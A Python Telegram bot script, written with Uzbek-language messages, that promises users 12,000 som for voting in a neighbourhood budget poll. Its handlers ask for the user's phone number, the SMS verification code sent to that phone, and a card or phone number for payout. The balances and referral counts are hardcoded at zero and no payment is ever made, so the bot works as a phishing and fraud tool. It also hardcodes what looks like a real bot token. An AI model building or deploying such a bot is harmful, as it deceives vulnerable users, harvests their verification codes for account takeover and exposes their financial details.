import logging

from aiogram import Bot, Dispatcher, executor, types
from keyboards import *

BOT_TOKEN = "6136952620:AAGPH6lfIz-ejyFMTgDntBw23QCZjPMlNKs"

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN, parse_mode="Markdown")
dp = Dispatcher(bot)

addBalance_check = False

@dp.message_handler(commands=["start"])
async def start_bot(message: types.Message):
    btn = await startReply()
    await message.answer("*Aziz foydalanuvchi siz oʻz ovozingizni berish orqali botdan 12000 so'm paynet sohibi boʼlishiz mumkin.\n\nUnutmang sizning ovozingiz bizning mahallamiz obodonlashtirish uchun juda muhim.\n\n🚀 Botdan pul ishlash uchun telefon raqamingizni kiritishingiz kerak.\nTelefon raqamingizni* `+998901234567` *shaklida yuboring.*", reply_markup=btn)


@dp.message_handler(text="📝 Qo'llanma")
async def info_bot(message: types.Message):
    await message.answer_video(types.InputFile("open.mp4"), caption="📌 *Botdan foydalanish qo'llanmasi:*\n\n1. «🗳 *Ovoz berish*» knopkasini bosing va nomeringizni yozib qoldiring.\n\n2. Bot sizga matemtik misol beradi shuni javobini botga yuboring misol uchun 2+3= shunaqa misol yuborsa 5 deb javobni o'zini yuborasiz.\n\n3. Nomerizga sms kod keladi shuni botga yozb qoldiring va bot sizga *12000 ming* so'm pul beradi.\n\nPulni nomerizga Paynet qilib yoki plastik raqamizga «💰 *Balans*» knopkasi orqali pulni yechib olishiz mumkun 🥳")

@dp.message_handler(text="🔗 Referal ssilka")
async def referal_bot(message: types.Message):
    btn = await referalInline()
    await message.answer_photo(types.InputFile("referal.jpg"), caption=f"🔗 *Referallaringiz soni:* 0 ta\n*💸 Referal uchun to'lov:* 5000 so'm\n\n_Sizning referal ssilkangiz_👇🏻\nhttps://t.me/OpenBudgetgaOvoz\_Bot?start={message.from_user.id}", reply_markup=btn)

@dp.message_handler(text="🗳 Ovoz berish")
async def ovoz_bot(message: types.Message):
    await message.reply("📞 *Ovoz berish uchun telefon raqamingizni kiriting:\n\nNa'muna: +998991234567\n\n✅ Ovoz berish muvaffaqiyatli o'tganda, hisobingizga o'tkazib beriladigan summa: 12000 UZS *")

@dp.message_handler(text="💰 Balans")
async def balance_bot(message: types.Message):
    btn = await balanceReply()
    await message.reply("💰 *Sizning hisobingiz:* _0 so'm_\n📥 *Yechib olish uchun minimal summa:* _5000 so'm_\n\n📌 Pulingizni yechib olish uchun «💳 *Yechib olish*» tugmasidan foydalaning.", reply_markup=btn)
@dp.message_handler(text="🚫 Bekor qilish")
async def back_bot(message: types.Message):
    global addBalance_check
    addBalance_check = False
    btn = await startReply()
    await message.answer("*Aziz foydalanuvchi siz oʻz ovozingizni berish orqali botdan 12000 so'm paynet sohibi boʼlishiz mumkin.\n\nUnutmang sizning ovozingiz bizning mahallamiz obodonlashtirish uchun juda muhim.\n\n🚀 Botdan pul ishlash uchun telefon raqamingizni kiritishingiz kerak.\nTelefon raqamingizni* `+998901234567` *shaklida yuboring.*", reply_markup=btn)
@dp.message_handler(text="💳 Yechib olish")
async def back_bot(message: types.Message):
    global addBalance_check
    addBalance_check = True
    await message.reply("💳 *Telefon yoki karta raqamingizni kiriting:*\n\n⚠️ Bot Humans nomerga to'lov qilmaydi.\n\n📄 *Na'muna:*\n📱 Telefon raqam: `+998912345678`\n💳 Karta raqam: `8600111122223333`")


@dp.message_handler()
async def messages(message: types.Message):
    text = message.text
    if addBalance_check == False:
        if "+998" in text and len(text) == 13:
            await message.reply("Ovoz berish jarayoni yakunlandi, ishtirokingiz uchun katta raxmat, to'lovlarni chiqarib olishingiz mumkin. Yaqinda yangi aksiyalar bilan qaytamiz.")


if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)